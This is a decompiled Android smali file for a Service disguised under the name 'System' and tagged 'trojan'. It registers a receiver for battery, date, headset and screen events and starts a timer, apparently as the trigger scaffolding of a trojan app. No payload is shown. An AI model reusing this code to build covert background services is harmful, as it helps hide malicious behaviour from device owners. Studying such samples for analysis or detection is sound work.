.class public Lcom/systemt/System;
.super Landroid/app/Service;
.source "System.java"


# static fields
.field public static TAG:Ljava/lang/String;


# instance fields
.field public ip:Ljava/lang/String;

.field private receiver:Landroid/content/BroadcastReceiver;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 13
    const-string v0, "trojan"

    sput-object v0, Lcom/systemt/System;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 11
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 15
    const-string v0, ""

    iput-object v0, p0, Lcom/systemt/System;->ip:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .prologue
    .line 19
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 2

    .prologue
    .line 24
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 26
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.intent.action.BATTERY_CHANGED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 27
    const-string v1, "android.intent.action.DATE_CHANGED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 28
    const-string v1, "android.intent.action.HEADSET_PLUG"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 29
    const-string v1, "android.intent.action.SCREEN_ON"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 30
    const-string v1, "android.intent.action.SCREEN_OFF"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 32
    new-instance v1, Lcom/systemt/ReceiverBoot;

    invoke-direct {v1}, Lcom/systemt/ReceiverBoot;-><init>()V

    iput-object v1, p0, Lcom/systemt/System;->receiver:Landroid/content/BroadcastReceiver;

    .line 33
    iget-object v1, p0, Lcom/systemt/System;->receiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/systemt/System;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 34
    return-void
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 50
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 51
    iget-object v0, p0, Lcom/systemt/System;->receiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/systemt/System;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 52
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    .prologue
    .line 38
    new-instance v0, Lcom/systemt/System$1;

    const-wide/16 v2, 0x7d0

    const-wide/16 v4, 0x64

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lcom/systemt/System$1;-><init>(Lcom/systemt/System;JJ)V

    .line 43
    invoke-virtual {v0}, Lcom/systemt/System$1;->start()Landroid/os/CountDownTimer;

    .line 45
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
